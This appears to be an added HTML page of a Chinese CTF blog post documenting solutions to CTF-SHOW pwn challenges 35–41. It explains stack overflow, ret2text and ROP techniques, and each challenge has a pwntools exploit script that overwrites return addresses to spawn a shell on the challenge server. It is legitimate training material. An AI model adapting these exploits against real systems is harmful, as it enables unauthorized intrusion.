@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pocon041.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CTF SHOW pwn35~110  pwn35（数组溢出）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-SHOW 刷题记录（Pwn）">
+<meta property="og:url" content="https://pocon041.github.io/2025/03/18/%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Pocon">
+<meta property="og:description" content="CTF SHOW pwn35~110  pwn35（数组溢出）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316194041817.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203127145.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203146247.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203321679.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203344392.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204824640.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204914827.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211622179.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211716861.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212051633.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212903030.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213228954.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213329394.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316215415314.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220015294.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220118547.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220845813.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317091227011.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141336080.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318094735493.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317092724016.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317093554911.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317094655085.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141526361.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141617461.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141627070.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317143350570.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144157630.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144316276.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145903183.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145919246.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317192647582.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193741187.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193801701.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317194030271.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317200343722.png">
+<meta property="article:published_time" content="2025-03-18T08:23:07.000Z">
+<meta property="article:modified_time" content="2025-03-18T08:23:07.000Z">
+<meta property="article:author" content="Pocon">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316194041817.png">
+
+<link rel="canonical" href="https://pocon041.github.io/2025/03/18/%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTF-SHOW 刷题记录（Pwn） | Pocon</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body class=" post-shell" itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pocon</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-blog">
+
+    <a href="/blog/" rel="section"><i class="fa fa-pencil-alt fa-fw"></i>Blog</a>
+
+  </li>
+        <li class="menu-item menu-item-projects">
+
+    <a href="/#projects" rel="section"><i class="fa fa-code fa-fw"></i>Projects</a>
+
+  </li>
+        <li class="menu-item menu-item-music">
+
+    <a href="/music/" rel="section"><i class="fa fa-music fa-fw"></i>Music</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+  <nav class="post-topbar" aria-label="Post navigation">
+  <a class="post-brand" href="/">Pocon</a>
+  <div>
+    <a href="/">Home</a>
+    <a href="/about/">About</a>
+    <a href="/blog/">Blog</a>
+    <a href="/archives/">Archive</a>
+    <a href="/categories/">Categories</a>
+    <a href="/tags/">Tags</a>
+    <a href="/gallery/">Gallery</a>
+    <a href="/music/">Music</a>
+  </div>
+</nav>
+
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block has-post-cover" style="--post-cover-image: url('/images/post-covers/77150895_p0.jpg'); --post-cover-overlay: linear-gradient(90deg, rgba(255, 255, 255, 0.86) 0%, rgba(255, 255, 255, 0.74) 52%, rgba(255, 255, 255, 0.58) 100%); --post-cover-position: center; --post-cover-size: cover; --post-cover-repeat: no-repeat; --post-cover-blend-mode: normal" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pocon041.github.io/2025/03/18/%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pocon">
+      <meta itemprop="description" content="Pocon's personal blog about Computer Vision, CTF, Multimedia Forensics, Web Security, Pwn and Machine Learning.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pocon">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF-SHOW 刷题记录（Pwn）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-18 16:23:07" itemprop="dateCreated datePublished" datetime="2025-03-18T16:23:07+08:00">2025-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">计算机</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
+<p>pwn35~110</p>
+</blockquote>
+<h2 id="pwn35（数组溢出）"><a href="#pwn35（数组溢出）" class="headerlink" title="pwn35（数组溢出）"></a>pwn35（数组溢出）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316194041817.png" alt="image-20250316194041817" style="zoom: 50%;"></p>
+<p>数组溢出，输入一个超长字符串即可</p>
+<h2 id="pwn36（后门函数直接得到flag）"><a href="#pwn36（后门函数直接得到flag）" class="headerlink" title="pwn36（后门函数直接得到flag）"></a>pwn36（后门函数直接得到flag）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203127145.png" alt="image-20250316203127145"></p>
+<p>看准了这个ctfshow函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203146247.png" alt="image-20250316203146247" style="zoom: 80%;"></p>
+<p>这里使用了gets函数读取s数组，且此程序没有栈溢出保护，故在这里可以进行栈溢出攻击。</p>
+<p>同时题目提示有后门函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203321679.png" alt="image-20250316203321679" style="zoom: 67%;"></p>
+<p>查看这个get_flag函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203344392.png" alt="image-20250316203344392" style="zoom:80%;"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fgets函数：char* fgets(char *restrict str, int size , FILE* restrict stream)</span><br><span class="line"></span><br><span class="line">char *fgets(“容器的地址”， “容器的大小”， “从哪里读取”）</span><br></pre></td></tr></tbody></table></figure>
+<p>所以我们需要做的是</p>
+<ul>
+<li>将ctfshow函数的返回地址填充为get_flag函数的返回地址</li>
+</ul>
+<p>查看get_flag函数的地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204824640.png" alt="image-20250316204824640" style="zoom:67%;"></p>
+<p>为0x08048586</p>
+<p>整体思路为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204914827.png" alt="image-20250316204914827" style="zoom:50%;"></p>
+<p>（当然还有一截previous ebp），所以距离返回地址的长度为0x28+4</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>, <span class="number">28183</span>)</span><br><span class="line">flag_addr = <span class="number">0x08048586</span></span><br><span class="line">payload = <span class="number">0x28</span> * <span class="string">b'a'</span> + <span class="string">b'b'</span> * <span class="number">4</span> + p32(flag_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="pwn37（32位后门函数获得shell）"><a href="#pwn37（32位后门函数获得shell）" class="headerlink" title="pwn37（32位后门函数获得shell）"></a>pwn37（32位后门函数获得shell）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211622179.png" alt="image-20250316211622179"></p>
+<p>总的来说和上道题大差不差，init清空缓冲区，logo和puts打印信息。只有ctfshow是挺关键的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211716861.png" alt="image-20250316211716861" style="zoom:80%;"></p>
+<p>buf数组长14，读入了0x32长的数据，故可以实现栈溢出</p>
+<p>题目提示有后门函数，故我们只需要找到后门函数的额起始地址即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212051633.png" alt="image-20250316212051633" style="zoom: 67%;"></p>
+<p>故后门函数地址为 0x08048521</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28281</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x08048521</span></span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x12</span> + <span class="string">b'b'</span> * <span class="number">4</span> + p32(backdoor_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="【-】pwn38（64位后门函数获得shell）"><a href="#【-】pwn38（64位后门函数获得shell）" class="headerlink" title="【*】pwn38（64位后门函数获得shell）"></a>【*】pwn38（64位后门函数获得shell）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212903030.png" alt="image-20250316212903030" style="zoom:67%;"></p>
+<p>题目可以说是完全一样，但是题目说是64位系统。放进checksec里看看就好了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213228954.png" alt="image-20250316213228954" style="zoom: 67%;"></p>
+<p>注意32位和64位的区别。首先context要设置一下，然后注意寄存器和地址都是八个字节</p>
+<p>找到后门函数地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213329394.png" alt="image-20250316213329394" style="zoom:67%;"></p>
+<p>0x400657？</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28147</span>)</span><br><span class="line">ret_addr = <span class="number">0x400657</span></span><br><span class="line">payload = <span class="number">10</span> * <span class="string">b'a'</span> + <span class="number">8</span> * <span class="string">b'b'</span> + p64(ret_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<p>结果出来是错的，为什么</p>
+<p>这是因为64位系统还需要处理<strong><font color="red">堆栈平衡</font></strong></p>
+<blockquote>
+<p>当我们在堆栈进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址</p>
+</blockquote>
+<p>因此我们还需要找一个地址： lev 的地址或者该函数结束的地址（即 retn 的地址）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316215415314.png" alt="image-20250316215415314" style="zoom:50%;"></p>
+<p>可以看到</p>
+<p>lev的地址：0x40065b</p>
+<p>retn的地址：0x+40066d</p>
+<p><strong><font color="blue">特别注意：构造 payload 时将该地址放在该函数开始地址之前</font></strong></p>
+<h3 id="exp2-0"><a href="#exp2-0" class="headerlink" title="exp2.0"></a>exp2.0</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lev_addr = <span class="number">0x40065b</span></span><br><span class="line">payload = <span class="number">10</span> * <span class="string">b'a'</span> + <span class="number">8</span> * <span class="string">b'b'</span> + p64(lev_addr) +p64(ret_addr)</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="pwn39（32位后门函数system与参数分离）"><a href="#pwn39（32位后门函数system与参数分离）" class="headerlink" title="pwn39（32位后门函数system与参数分离）"></a>pwn39（32位后门函数system与参数分离）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220015294.png" alt="image-20250316220015294" style="zoom:67%;"></p>
+<p>还是我们喜闻乐见的32位ret2text</p>
+<p>只不过这里的后门不是函数，而是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220118547.png" alt="image-20250316220118547"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220845813.png" alt="image-20250316220845813" style="zoom:50%;"></p>
+<p>这里将<code>/bin/sh</code>和<code>system</code>函数分开了</p>
+<p>/bin/sh的地址：0x08048750</p>
+<p>system()的地址：0x080483A0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317091227011.png" alt="image-20250317091227011" style="zoom:50%;"></p>
+<p>这张图是便于习惯的，真实的情况如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141336080.png" alt="image-20241117141336080" style="zoom: 50%;"></p>
+<p>这里从ctfshow函数跳转到了system函数</p>
+<p>我们要做的是将返回地址覆盖为system函数，并将参数1填充上/bin/sh字符串的起始位置。（注意这里的参数不能是/bin/sh整个字符串，因为字符串本身被硬编码为rodata节中，要传递只能通过地址）</p>
+<p>偏移量是：12h + 4    </p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318094735493.png" alt="image-20250318094735493"></p>
+<p>这个exit可以是任意地址，如0xdeadbeef(64bit)</p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28191</span>)</span><br><span class="line">str_addr = <span class="number">0x08048750</span></span><br><span class="line">sys_addr = <span class="number">0x080483A0</span></span><br><span class="line">payload = <span class="string">b'a'</span>* <span class="number">0x12</span> + <span class="string">b'b'</span> * <span class="number">4</span> + p32(sys_addr) + <span class="string">b'c'</span> * <span class="number">4</span> + p32(str_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="pwn40（64位后门函数与参数分离（ROP））"><a href="#pwn40（64位后门函数与参数分离（ROP））" class="headerlink" title="pwn40（64位后门函数与参数分离（ROP））"></a>pwn40（64位后门函数与参数分离（ROP））</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317092724016.png" alt="image-20250317092724016" style="zoom:67%;"></p>
+<p>发现是64位系统。两者差异如下：</p>
+<ul>
+<li>x86<ul>
+<li>使用栈来传递参数</li>
+<li>使用eax存放返回值</li>
+</ul>
+</li>
+<li>x64<ul>
+<li>前6个参数依次存放于rdi、rsi、rdx、rcx、r8、r9寄存器中</li>
+<li>第7个以后的参数存放于栈中</li>
+</ul>
+</li>
+</ul>
+<p>所以我们这里需要控制rdi的值</p>
+<p>利用<strong>ROP</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only "pop|ret"</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317093554911.png" alt="image-20250317093554911" style="zoom:67%;"></p>
+<p>我们使用pop rdi；ret即可，地址为 0x4007e3</p>
+<p>ret的地址为：0x4004fe</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317094655085.png" alt="image-20250317094655085" style="zoom:50%;"></p>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28150</span>)</span><br><span class="line">offset = <span class="number">0xa</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4007e3</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">sys_addr = <span class="number">0x400520</span></span><br><span class="line">bin_sh_addr = <span class="number">0x400808</span></span><br><span class="line">payload = offset * <span class="string">b'a'</span> + <span class="string">b'b'</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="pwn41（32位sh替换-bin-sh）"><a href="#pwn41（32位sh替换-bin-sh）" class="headerlink" title="pwn41（32位sh替换/bin/sh）"></a>pwn41（32位sh替换/bin/sh）</h2><p>正如题目所说，没有/bin/sh了，但是又system函数和 ”echo flag“字符串，以及“sh”字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141526361.png" alt="image-20250317141526361"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141617461.png" alt="image-20250317141617461" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141627070.png" alt="image-20250317141627070" style="zoom:50%;"></p>
+<p>一般情况下，sh和/bin/sh是等效的</p>
+<ol>
+<li>system(“/bin/sh”)：在Linux和类Unix系统中，/bin/sh通常是一个符号链接，指向<strong>系统默认的shell程序（如Bash或Shell）</strong>。因此，使用system(“/bin/sh”)会<strong>启动指定的shell程序并在新的子进程中执行</strong>。这种方式可以确保使用系统默认的shell程序执行命令，因为/bin/sh链接通常指向默认shell的可执行文件</li>
+<li>system(“sh”)：使用system(“sh”)会<strong>直接启动一个名为sh的shell程序，并在新的子进程中执行</strong>。这种方式假设系统的<strong>环境变量$PATH已经配置</strong>了能够找到sh可执行文件的路径，否则可能会导致找不到sh而执行失败。</li>
+</ol>
+<p>所以还是一样的，只是把/bin/sh字符串换成sh而已</p>
+<p>system函数位置：0x080483D0</p>
+<p>sh字符串位置：0x080487BA</p>
+<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">'linux'</span>, arch = <span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28297</span>)</span><br><span class="line">system_addr = <span class="number">0x080483D0</span></span><br><span class="line">sh_addr = <span class="number">0x080487BA</span></span><br><span class="line">payload = <span class="number">0x12</span> * <span class="string">b'a'</span> + <span class="number">4</span> * <span class="string">b'b'</span> + p32(system_addr) + <span class="number">4</span> * <span class="string">b'c'</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
